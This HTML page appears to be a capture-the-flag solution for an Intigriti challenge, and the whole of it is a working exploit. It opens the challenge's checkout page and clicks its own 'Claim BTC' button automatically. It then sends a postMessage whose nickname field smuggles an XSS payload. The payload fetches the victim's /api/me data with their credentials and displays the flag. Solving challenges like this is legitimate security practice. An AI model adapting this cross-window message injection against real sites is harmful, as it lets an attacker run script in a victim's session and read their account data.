<!DOCTYPE html>
<html>
<body>
<button id=b>Claim BTC</button>
<script>
const b=document.getElementById('b');
b.onclick=()=>{
    const w=open('https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000','x');
    setTimeout(()=>{
        const p=`<img src=x onerror="fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>alert(d.flag))">`;
        w.postMessage({type:'submitTransaction',transaction:{toAddress:'bc1q',currency:'BTC',amount:0.0001,nickname:p}},'*');
    },3000);
};
setTimeout(()=>b.click(),500);
</script>
</body>
</html>
